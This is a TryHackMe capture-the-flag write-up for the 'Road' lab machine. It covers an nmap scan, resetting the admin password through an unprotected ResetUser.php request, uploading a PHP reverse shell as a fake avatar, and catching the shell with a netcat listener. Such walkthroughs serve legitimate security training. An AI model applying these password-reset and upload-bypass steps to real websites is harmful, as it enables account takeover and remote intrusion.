# Road
```sh
export IP=machine_ip
```
# Information Gathering:

```sh
nmap -A -sC -sV $IP
```
```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-05 20:57 CEST
Nmap scan report for 10.10.0.79
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We got some services running 80 http 22 ssh

![Screenshot_25](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/55ac3812-1da6-47f6-be51-f3b26915689d)

I found /ResetUser.php  so i was able to changed admin password in burpsuite  like this : 

![Screenshot_27](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/39a6fd6f-d2c8-44c9-8775-2821fe690832)

By doing this i found upload avatar in the Profile 

![Screenshot_26](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/6e2bedaf-595b-4c9e-b760-7e7e3d2ce203)

That might get us to manipulate the php-reverse-shell extension to be .php instead of .jpg :..

![Screenshot_28](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/ccfb0248-3d53-49fd-8313-411d09fe0cd9)

this is the dir that has our revshell i found it in the admin  /profile.php  source code 

![Screenshot_29](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/cb24afb2-0e7a-48e7-ac78-6ea2f4e66395)

```sh
nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.8.46.178] from (UNKNOWN) [10.10.0.79] 37742
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:02:45 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
